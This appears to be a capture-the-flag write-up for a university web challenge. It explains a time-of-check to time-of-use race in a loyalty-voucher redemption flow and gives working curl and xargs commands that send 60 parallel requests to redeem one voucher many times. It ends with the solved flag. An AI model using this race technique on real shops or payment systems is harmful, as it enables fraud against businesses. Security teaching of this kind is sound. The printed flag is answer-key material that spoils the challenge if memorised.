# RaceTheClock_MU (Security Impossible CTF 2026 - Monash University, web)

RaceTheClock presents an e-commerce loyalty rewards platform. Users can redeem promotional vouchers to earn loyalty credits. The challenge shop offers the flag for purchase at 500 credits, but each registered account receives only a single voucher worth 100 credits. Our objective is to exploit a concurrency flaw to multiply the value of the single-use voucher.

## Concurrency and Time-of-Check to Time-of-Use (TOCTOU)

When a web application executes multi-step business logic without database-level transactions or mutex locks, it introduces a Time-of-Check to Time-of-Use (TOCTOU) race window.

Consider the voucher redemption logic:
1. **Check**: The application queries the database to verify if the user's voucher is marked as used (`SELECT used FROM vouchers WHERE id = ?`).
2. **Compute**: If `used == false`, the application computes `new_balance = balance + 100`.
3. **Credit**: The application updates the balance (`UPDATE users SET balance = new_balance WHERE id = ?`).
4. **Invalidate**: The application marks the voucher as consumed (`UPDATE vouchers SET used = true WHERE id = ?`).

If an attacker sends 50 requests nearly simultaneously across concurrent TCP connections, multiple requests arrive during step 1 before any request executes step 4. Each concurrent thread sees `used == false`, approves the redemption, and credits an additional 100 points to the user's balance.

## Engineering the Race Attack

To exploit the concurrency window, requests must reach the server within the span of a few milliseconds. We use `curl` parallel execution via `xargs -P` to trigger concurrent requests:

1. First, we register an account and save the session cookies:
```bash
curl -s -c cookies.txt -X POST http://$TARGET:5111/register -d 'user=attacker&pass=attacker'
```

2. We check our initial balance, which begins at 0 credits:
```bash
curl -s -b cookies.txt http://$TARGET:5111/balance
```

3. We dispatch 60 parallel HTTP requests targeting `/redeem`:
```bash
seq 60 | xargs -P60 -I{} curl -s -b cookies.txt -X POST http://$TARGET:5111/redeem -o /dev/null
```

4. We check the balance:
```bash
curl -s -b cookies.txt http://$TARGET:5111/balance
```

Output:
```json
{"balance": 1800}
```

The concurrent execution raced successfully, elevating the balance to 1800 credits (well over the 500 credit requirement).

## Purchasing the Flag

With sufficient funds, we request `/flag`:

```bash
curl -s -b cookies.txt http://$TARGET:5111/flag
```

The application verifies that `balance >= 500` and awards the flag.

Flag: `sictf{f1f8a23c1829914465b21f6705c76fe1}`
